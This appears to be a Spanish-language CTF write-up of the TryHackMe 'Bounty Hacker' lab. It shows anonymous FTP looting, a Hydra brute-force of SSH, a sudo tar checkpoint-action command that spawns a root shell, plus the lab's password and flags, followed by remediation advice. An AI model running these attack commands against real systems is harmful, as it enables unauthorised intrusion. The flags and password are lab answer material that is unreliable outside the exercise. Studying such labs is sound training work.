---
title: TryHackMe - Bounty Hacker
date: 2026-11-07
platform: TryHackMe
difficulty: Easy
os: Linux
tags:
  - FTP
  - SSH
  - Hydra
  - Sudo
  - GTFObins
status: Completada
---

# Resumen Ejecutivo
**IP Objetivo:** `10.64.157.19`

**Descripción breve:** Máquina Linux de dificultad fácil con [[FTP - SFTP|FTP]] anónimo, [[SSH]] y HTTP expuestos. El FTP permite descargar `task.txt`, que revela el usuario `lin`, y `locks.txt`, que se usa como diccionario para fuerza bruta con [[Hydra]]. Tras acceder por [[SSH]] se enumeran los permisos de `sudo` y se escala a `root` abusando de `tar`, un binario de GTFObins.

---

## 1. Information Gathering (Reconocimiento)

### Escaneo de Puertos con [[Nmap]]
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.64.157.19 -n -Pn -oG escaneo
```

**Puertos Abiertos:**
- 21 ([[FTP - SFTP|FTP]])
- 22 ([[SSH]])
- 80 (HTTP)

### Enumeración de Servicios / Fuzzing
```bash
ftp 10.64.157.19    # usuario: anonymous, contraseña vacía
```

- [[FTP - SFTP|FTP]]: el acceso anónimo está habilitado y permite descargar dos archivos:
  - `task.txt`: contiene notas de `lin` y revela el nombre de usuario.
  - `locks.txt`: lista de posibles contraseñas que se puede usar como diccionario.
- HTTP: el puerto 80 solo muestra la página por defecto de Apache, sin rutas de interés.

**Descubrimientos clave:**
- Usuario válido: `lin` (obtenido de `task.txt`).
- Diccionario de contraseñas: `locks.txt`.

---

## 2. Vulnerability Assessment (Análisis de Vulnerabilidades)
- El servicio [[FTP - SFTP|FTP]] permite autenticación anónima y expone información interna de la organización.
- Los archivos descargados revelan un nombre de usuario válido y una lista de contraseñas, lo que hace viable un ataque de fuerza bruta contra [[SSH]] con [[Hydra]].

---

## 3. Exploitation (Acceso Inicial)

### Metodología
1. Acceder al [[FTP - SFTP|FTP]] de forma anónima y descargar `task.txt` y `locks.txt`.
2. Identificar el usuario `lin` en `task.txt` y usar `locks.txt` como diccionario.
3. Lanzar un ataque de fuerza bruta contra [[SSH]] con [[Hydra]].
4. Iniciar sesión por [[SSH]] con las credenciales obtenidas y leer la flag de usuario.

### Ejecución
```bash
hydra -l lin -P locks.txt ssh://10.64.157.19
```

- Hydra devuelve la contraseña de `lin`: `RedDr4gonSynd1cat3`.

```bash
ssh lin@10.64.157.19
```

```bash
cat user.txt
```

**Prueba de acceso (User Flag):**
```bash
THM{CR1M3_SyNd1C4T3}
```

---

## 4. Privilege Escalation ([[Escaladas de privilegios]])

### Enumeración Interna
- Con la sesión de `lin` se ejecuta `sudo -l` para revisar los permisos del usuario.
- El resultado muestra que `lin` puede ejecutar `/bin/tar` como `root`.

### Explotación Local
1. Se consulta `tar` en GTFObins y se confirma que permite ejecutar comandos mediante `--checkpoint-action`.
2. Se lanza una shell desde `tar` con el permiso de `sudo`, obteniendo acceso como `root` (ver [[Escaladas de privilegios#sudo -l|sudo -l]]).

### Ejecución
```bash
sudo -l
```

```bash
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

```bash
cat /root/root.txt
```

**Prueba de acceso (Root/SYSTEM Flag):**
```bash
THM{80UN7Y_h4cK3r}
```

---

## 5. Post-Exploitation & Clean Up
- [x] Verificar el acceso como `root` y documentar la flag obtenida.
- [x] Eliminar los archivos descargados durante la enumeración (`task.txt`, `locks.txt` y `escaneo`).
- [x] Cerrar las sesiones de [[FTP - SFTP|FTP]] y [[SSH]] abiertas.

---

## Remediation (Mitigaciones)
- **Acceso inicial:**
  - Deshabilitar el acceso anónimo en [[FTP - SFTP|FTP]] y exigir autenticación.
  - No almacenar notas internas, nombres de usuarios ni listas de contraseñas en recursos accesibles.
  - Aplicar una política de contraseñas robusta y limitar los intentos de inicio de sesión en [[SSH]] (por ejemplo, con `fail2ban`).
- **Escalada:**
  - No conceder `sudo` sobre binarios que permitan ejecutar comandos (`tar`, `vim`, `less`, `find`, etc.).
  - Aplicar el principio de mínimo privilegio y revisar periódicamente `sudoers`.
  - Auditar los permisos con `sudo -l` y consultar GTFObins antes de autorizar un binario.
